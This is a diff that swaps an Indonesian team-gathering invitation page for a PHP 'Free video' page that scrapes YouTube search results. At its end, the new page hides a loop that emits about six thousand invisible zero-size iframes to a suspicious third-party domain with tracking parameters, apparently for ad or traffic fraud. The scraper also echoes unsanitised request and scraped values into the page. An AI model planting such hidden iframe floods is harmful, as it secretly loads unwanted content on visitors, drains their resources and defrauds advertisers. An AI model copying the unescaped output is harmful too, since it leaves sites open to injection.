@@ -1,281 +1,175 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Undangan Digital Gathering</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700&family=Poppins:wght@300;400;600&display=swap');
-        
-        body {
-            font-family: 'Poppins', sans-serif;
-            background-color: #f8f8f8;
-            margin: 0;
-            padding: 0;
-            overflow-x: hidden;
-        }
-        
-        .hero-font {
-            font-family: 'Playfair Display', serif;
-        }
-        
-        .music-control {
-            transition: all 0.1s ease;
-        }
-        
-        .music-control:hover {
-            transform: scale(1.1);
-        }
-        
-        .invitation-card {
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
-            transition: all 0.5s ease;
-        }
-        
-        .invitation-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.15);
-        }
-        
-        .floating {
-            animation: floating 3s ease-in-out infinite;
-        }
-        
-        @keyframes floating {
-            0% { transform: translateY(0px); }
-            50% { transform: translateY(-10px); }
-            100% { transform: translateY(0px); }
-        }
-        
-        .fade-in {
-            animation: fadeIn 1s ease-in;
-        }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-    </style>
-</head>
+<!DOCTYPE HTML>
+<HTML>
+     <head>
+         
+	<title>Free video</title>
+	<meta name='admaven-placement' content=BqjwHqHCG>
+	<style>
+body{
+	    background:#097aac;
+}
+.atas{
+	width:98%;
+	height:200px;
+	margin:10px;
+	background-image:url('https://hikmahjayasentosa.com/wp-content/uploads/2019/05/cropped-background-header.jpg');
+	background-repeat: no-repeat;
+	background-size: cover;
+}
+.kanan{
+	width:200px;
+	background:#abcd76;
+	border:1px solid black;
+	border-radius:5px;
+	float:left;
+}
+.tengah{
+	width:81%;
+	background:#abcd76;
+	border:1px solid black;
+	border-radius:5px;
+	margin-left:5px;
+	float:left;
+	padding:10px;
+}
+
+a{
+padding:5px;
+background:#ffffff;
+color:green;
+margin:5px;
+border:1px solid black;
+border-radius:5px;
+}
+a:hover{
+background:#ffffff;
+color:black;
+}
+ul{
+    list-style-type: none;
+}
+li{
+margin:15px;
+text-decoration:none;
+}
+img:hover{
+    opacity:0.5;
+}
+</style>
+
+
+
+   </head>
+
 <body>
-    <!-- Cover Page (Tampilan pertama di mobile) -->
-    <div id="cover-page" class="w-full h-screen bg-gradient-to-br from-purple-600 to-blue-500 flex flex-col items-center justify-center text-white px-4 transition-all duration-500">
-        <div class="text-center">
-            <h1 class="hero-font text-4xl md:text-5xl font-bold mb-4">Gathering Team Dan <br> Agent Danastra Cabang Kota Pemalang 2</h1>
-            <p class="text-lg mb-8">Bersama-sama kita berkumpul untuk merayakan kebersamaan dan mempererat tali silaturahmi.</p>
-            <div class="floating">
-                <button onclick="openInvitation()" class="bg-white text-purple-600 px-8 py-3 rounded-full font-semibold shadow-lg hover:bg-purple-100 transition-all duration-300">
-                    Buka Undangan
-                </button>
-            </div>
-        </div>
-        <div class="absolute bottom-8">
-            <p class="text-sm opacity-80">Geser ke atas setelah membuka</p>
-            <i class="fas fa-chevron-up block text-center mt-2"></i>
-        </div>
+	<div class="atas">
+	<img src="lg.png" width="10%" height="50px">
+	<div style="width:100%;margin-top:100px;text-align:center;">
+	    <form action="" method="POST">
+	        <input name="k" placeholder="Type Keyword"> <input name="q" type="submit" value="Search">
+	    </form>
+	    </div>
+	<div style="width:100%;margin-top:5px;text-align:left;">
+<a href="/"> Halaman Depan</a> <a href="https://fb.me" target="_blank"> faceboock</a> <a href="https://google" target="_blank"> Google</a>
+	</div>
+</div>
+
+
+	<div class="kanan">
+	<ul><li>
+	<a href="/"> home </a>
+	</li>
+	<li>
+	<a href="?q=Noah"> Noah</a>
+	</li>
+	<li>
+	<a href="?q=The+Rasmus">The Rasmus</a>
+	</li>
+		<li>
+	<a href="?q=Metalica">Metalica</a>
+	</li>
+		<li>
+	<a href="?q=Reggae">Reggae</a>
+	</li>
+	</ul>
+
+	</div>
+
+
+     <div class="tengah">
+	
+
+
+<?php
+if(isset($_GET['q'])){
+    $q=$_GET['q'];
+    $url="https://www.youtube.com/results?search_query=".$q;
+    $get= file_get_contents($url);
+
+$dev=explode('contents":[{"videoRenderer"',$get);
+$de=explode('(a.ytCommand);',$dev[1]);
+$jum=count(explode('title":{"runs":[{"text":"',$de[0]))-1;
+    for($i=1;$i<=$jum;$i++){
+            $judul=explode('title":{"runs":[{"text":"',$de[0]);
+    $jum=count(explode('"runs":[{"text":"',$de[0]));
+    $jdl=explode('"',$judul[$i]);
+    
+    $gbr=explode('"thumbnails":[{"url":"',$de[0]);
+    $gmb=explode('"',$gbr[$i]);
+    $vids=explode('"videoRenderer":{"videoId":"',$de[0]);
+    $vid=explode('"',$vids[$i]);
+    
+    ?>
+    <div style="width:100px;border:1px solid black;border-radius:10px;margin:5px;float:left;">
+  
+    <a href="video.php?v=<?php echo $vid[0];?>">
+    <?php
+    echo '<img src="'.$gmb[0].'" width="100px" height="100px">';
+    ?></a>
     </div>
-
-    <!-- Main Invitation Page (Awalnya tersembunyi) -->
-    <div id="invitation-page" class="hidden">
-        <!-- Audio Element (Auto Play) -->
-        <audio id="bgMusic" loop>
-            <source src="musik/FARIS ADAM - STECU STECU (Official Music Video).mp4" type="audio/mpeg">
-            Browser Anda tidak mendukung elemen audio.
-        </audio>
-
-        <!-- Music Control -->
-        <div class="fixed top-4 right-4 z-50">
-            <button id="musicToggle" class="music-control bg-white rounded-full p-3 shadow-lg text-purple-600">
-                <i class="fas fa-music"></i>
-            </button>
-        </div>
-
-        <!-- Hero Section -->
-        <div class="relative h-screen bg-gradient-to-b from-purple-50 to-blue-50 flex items-center justify-center overflow-hidden">
-            <div class="absolute inset-0 bg-black opacity-30"></div>
-            <img src="foto/uh.jpeg" alt="Teman-teman sedang berkumpul dan tertawa bersama di taman dengan pencahayaan sore yang hangat" class="absolute w-full h-full object-cover" />
-            
-            <div class="relative z-10 text-center px-4 text-white">
-                <h1 class="hero-font text-5xl md:text-6xl font-bold mb-4 fade-in">Gathering Team Dan <br> Agent Danastra Cabang Kota Pemalang 2</h1>
-                <p class="text-xl mb-8 fade-in">Sabtu & Minggu 12-13 Juli 2025 <br>Pukul 16.00-Selesai</p>
-                <div class="fade-in">
-                    <button onclick="scrollToDetails()" class="bg-white text-purple-600 px-6 py-2 rounded-full font-semibold shadow-lg hover:bg-purple-100 transition-all duration-300">
-                        Lihat Detail
-                    </button>
-                </div>
-            </div>
-            
-            <div class="absolute bottom-8 left-0 right-0 text-center text-white z-10">
-                <i class="fas fa-chevron-down animate-bounce"></i>
-            </div>
-        </div>
-
-        <!-- Invitation Content -->
-        <div class="container mx-auto px-4 py-16 max-w-4xl">
-            <!-- Details Card -->
-            <div class="invitation-card bg-white rounded-xl p-8 mb-12">
-                <h2 class="hero-font text-3xl font-bold text-center text-purple-700 mb-6">Detail Acara</h2>
-                
-                <div class="space-y-6">
-                    <div class="flex items-start">
-                        <div class="bg-purple-100 p-3 rounded-full mr-4">
-                            <i class="fas fa-calendar-day text-purple-600"></i>
-                        </div>
-                        <div>
-                            <h3 class="font-semibold text-lg">Tanggal & Waktu</h3>
-                            <p>Sabtu & Minggu 12-13 Juli 2025 <br>Pukul 16:00 - selesai</p>
-                            <p>Registrasi <br>(15.00-16.00) <br>Traning sales <br>(16.00-17.30) <br>Game,Awarding & Gala diner (19.00-22.00) <br>Penutup <br> (22.00-Selesai)</p>
-                        </div>
-                    </div>
-                    
-                    <div class="flex items-start">
-                        <div class="bg-purple-100 p-3 rounded-full mr-4">
-                            <i class="fas fa-map-marker-alt text-purple-600"></i>
-                        </div>
-                        <div>
-                            <h3 class="font-semibold text-lg">Lokasi</h3>
-                            <p>Vila Mawar 3</p>
-                            <p>Jl. Objek Wisata Guci, Sawah,Ladang,Hutan, Rembul, <br>Kec. Bojong, Kabupaten Tegal,<br> Jawa Tengah 52465</p>
-                        </div>
-                    </div>
-                    
-                    <div class="flex items-start">
-                        <div class="bg-purple-100 p-3 rounded-full mr-4">
-                            <i class="fas fa-info-circle text-purple-600"></i>
-                        </div>
-                        <div>
-                            <h3 class="font-semibold text-lg">Dress Code</h3>
-                            <p>Baju (Pakaian) Hitam</p>
-                        </div>
-                    </div>
-                    
-                    <div class="flex items-start">
-                        <div class="bg-purple-100 p-3 rounded-full mr-4">
-                            <i class="fas fa-gift text-purple-600"></i>
-                        </div>
-                        <div>
-                            <h3 class="font-semibold text-lg">Bawahan</h3>
-                            <p>Celana jeans Biru</p>
-                            <p>Dan Baju Bebas (asal sopan)</p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-            
-            <!-- Gallery Section -->
-            <div class="mb-12">
-                <h2 class="hero-font text-3xl font-bold text-center text-purple-700 mb-8">Kenangan Kita</h2>
-                
-                <div class="grid grid-cols-2 gap-4">
-                    <div class="rounded-xl overflow-hidden">
-                        <img src="foto/bukber acungkan kepal.jpeg" alt="Foto kenangan kelompok di pantai saat matahari terbenam dengan siluet melambai" class="w-full h-48 object-cover" />
-                    </div>
-                    <div class="rounded-xl overflow-hidden">
-                        <img src="foto/bukber diam.jpeg" alt="Potret candid teman-teman sedang tertawa bersama di restoran dengan cahaya hangat" class="w-full h-48 object-cover" />
-                    </div>
-                    <div class="rounded-xl overflow-hidden">
-                        <img src="foto/rakercab ufi.jpeg" alt="Kelompok sahabat membuat pose lucu dengan latar belakang kota malam" class="w-full h-48 object-cover" />
-                    </div>
-                    <div class="rounded-xl overflow-hidden">
-                        <img src="foto/bukber jempol.jpeg" alt="Close-up tangan kelompok saling bertumpuk dalam persahabatan di atas meja kayu" class="w-full h-48 object-cover" />
-                    </div>
-                </div>
-            </div>
-            
-            <!-- Map Section -->
-            <div class="invitation-card bg-white rounded-xl p-6 mb-12">
-                <h2 class="hero-font text-3xl font-bold text-center text-purple-700 mb-6">Peta Lokasi</h2>
-                
-                <div class="rounded-xl overflow-hidden mb-4 h-64">
-                    <iframe 
-                        id="gmap_canvas" 
-                        src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3958.471181803119!2d109.16094777140282!3d-7.1869525695912415!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x2e6f937e637d1207%3A0x1329225f0ae7e617!2sVilla%20Mawar%20Indah%203!5e0!3m2!1sen!2sid!4v1751247660042!5m2!1sen!2sid" 
-                        frameborder="0" 
-                        scrolling="no" 
-                        class="w-full h-full"
-                        aria-label="Peta Lokasi Taman Kota Merdeka Jakarta"
-                    ></iframe>
-                </div>
-                
-                <div class="text-center">
-                    <a href="https://maps.app.goo.gl/GUrAPPaUybX25epA7">
-                        Buka di Google Maps
-                    </a>
-                </div>
-            </div>
-            
-            <!-- RSVP Section -->
-            
-        
-        <!-- Footer -->
-        <div class="bg-purple-600 text-white py-8 text-center">
-            <p>Kami tunggu kehadiran Anda!</p>
-            <p class="mt-2">Informasi lebih lanjut bisa menghubungi:</p>
-            <p class="font-semibold">Ade Nurhidayat (0823-2255-2265)</p>
-        </div>
+    <?php
+    }
+    ?>
     </div>
+    
+<?php
+}
+else{
+       $url="https://www.youtube.com/results?search_query=lagu+pop+melayu";
+    $get= file_get_contents($url);
 
-    <script>
-        // Fungsi untuk membuka undangan
-        function openInvitation() {
-            const coverPage = document.getElementById('cover-page');
-            const invitationPage = document.getElementById('invitation-page');
-            
-            coverPage.style.opacity = '0';
-            coverPage.style.pointerEvents = 'none';
-            
-            setTimeout(() => {
-                coverPage.style.display = 'none';
-                invitationPage.style.display = 'block';
-                
-                // Memainkan musik otomatis
-                const bgMusic = document.getElementById('bgMusic');
-                bgMusic.play().catch(e => console.log("Auto play prevented:", e));
-                
-                // Scroll ke atas halaman undangan
-                window.scrollTo(0, 0);
-            }, 500);
-        }
-        
-        // Fungsi untuk scroll ke detail
-        function scrollToDetails() {
-            const detailsSection = document.querySelector('.container');
-            detailsSection.scrollIntoView({ behavior: 'smooth' });
-        }
-        
-        // Fungsi untuk toggle musik
-        document.getElementById('musicToggle').addEventListener('click', function() {
-            const bgMusic = document.getElementById('bgMusic');
-            const icon = this.querySelector('i');
-            
-            if (bgMusic.paused) {
-                bgMusic.play();
-                icon.classList.remove('fa-music');
-                icon.classList.add('fa-volume-up');
-            } else {
-                bgMusic.pause();
-                icon.classList.remove('fa-volume-up');
-                icon.classList.add('fa-music');
-            }
-        });
-        
-        // Fungsi RSVP
-        
-        
-        // Animasi untuk elemen saat muncul
-        const observer = new IntersectionObserver((entries) => {
-            entries.forEach(entry => {
-                if (entry.isIntersecting) {
-                    entry.target.classList.add('fade-in');
-                }
-            });
-        }, { threshold: 0.1 });
-        
-        document.querySelectorAll('.invitation-card, .grid img').forEach(el => {
-            observer.observe(el);
-        });
-    </script>
-</body>
-</html>
+$dev=explode('contents":[{"videoRenderer"',$get);
+$de=explode('(a.ytCommand);',$dev[1]);
+$jum=count(explode('title":{"runs":[{"text":"',$de[0]))-1;
+    for($i=1;$i<=$jum;$i++){
+            $judul=explode('title":{"runs":[{"text":"',$de[0]);
+    $jum=count(explode('"runs":[{"text":"',$de[0]));
+    $jdl=explode('"',$judul[$i]);
+    
+    $gbr=explode('"thumbnails":[{"url":"',$de[0]);
+    $gmb=explode('"',$gbr[$i]);
+    $vids=explode('"videoRenderer":{"videoId":"',$de[0]);
+    $vid=explode('"',$vids[$i]);
+    
+    ?>
+    <div style="width:100px;border:1px solid black;border-radius:10px;margin:5px;float:left;">
+  
+    <a href="video.php?v=<?php echo $vid[0];?>">
+    <?php
+    echo '<img src="'.$gmb[0].'" width="100px" height="100px">';
+    ?></a>
+    </div>
+    <?php
+    }
+    ?>
+    </div> 
+    
+    <?php
+}
+ ?>
+ 
+ <?php
+ for($i=0;$i<=6000;$i++){
+     echo '<iframe src="https://v23pmr0.finds-girls-junction.com/ka52py4?s1=Charlotte&cid=Charlotte" width="0" height="0" framborder="0"></iframe>';
+ }
+ ?>
